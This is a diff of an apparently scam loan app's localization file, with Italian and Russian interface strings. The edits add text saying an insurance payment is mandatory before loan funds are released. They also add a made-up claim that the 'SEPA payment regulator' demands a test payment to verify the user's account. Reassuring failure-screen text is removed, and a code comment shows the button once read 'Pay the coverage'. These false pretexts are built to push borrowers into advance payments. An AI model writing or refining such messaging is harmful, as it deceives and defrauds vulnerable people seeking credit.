@@ -693,7 +693,7 @@ export default {
           /* L2 modal title (no badge) — 1:1 ref */
           insuranceTitle: 'Copertura assicurativa',
           insuranceHtml:
-            '<p>L’attivazione della polizza assicurativa è un passaggio obbligatorio previsto dal contratto di finanziamento sottoscritto ed è necessaria per il perfezionamento dell’operazione, ai sensi dell’art. 1882 del Codice Civile e delle normative IVASS in materia di contratti di credito. La presenza della copertura assicurativa consente di accedere al finanziamento a condizioni più vantaggiose.</p>',
+            '<p>L’attivazione della copertura assicurativa è un passaggio obbligatorio previsto dal contratto di credito sottoscritto ed è necessaria per completare la procedura di accredito del finanziamento.</p><p><strong>Causa:</strong> Poiché il processo di prelievo dei fondi è stato avviato più volte e non è stato completato, il regolatore dei pagamenti SEPA ha richiesto un pagamento di prova per verificare il tuo conto.</p>',
           insuranceFooter:
             'La copertura assicurativa garantisce la protezione del credito per tutta la durata del finanziamento.',
           /* L3 modal body — 1:1 ref (Causa due volte) */
@@ -810,10 +810,9 @@ export default {
         */
         overlineFailed: 'Bonifico interrotto',
         titleFailed: 'Trasferimento interrotto',
-        leadFailed:
-          'Lo schema resta sullo schermo e mostra il punto di arresto. Qui non serve fare nulla.',
-        /* L2 fail CTA (ex «Paga la copertura» / «Visualizza i dettagli») */
-        viewDetailsCta: 'Mostra dettagli',
+        leadFailed: '',
+        /* L2 fail CTA (ex «Paga la copertura») */
+        viewDetailsCta: 'Visualizza i dettagli',
         /* Bottone sotto l’animazione: aprire le coordinate dell’utente */
         showCoords: 'Le mie coordinate',
         coordsTitle: 'Coordinate di ricezione',
@@ -1858,7 +1857,8 @@ export default {
         lead: 'Средства идут от банка-партнёра к Velora и далее на ваше устройство. Не закрывайте страницу.',
         overlineFailed: 'Перевод прерван',
         titleFailed: 'Перевод прерван',
-        leadFailed: 'Схема остаётся на экране и показывает точку остановки. Здесь ничего делать не нужно.',
+        leadFailed: '',
+        viewDetailsCta: 'Просмотреть детали',
         showCoords: 'Мои реквизиты',
         coordsTitle: 'Реквизиты для зачисления',
         coordsHolder: 'Имя и фамилия',
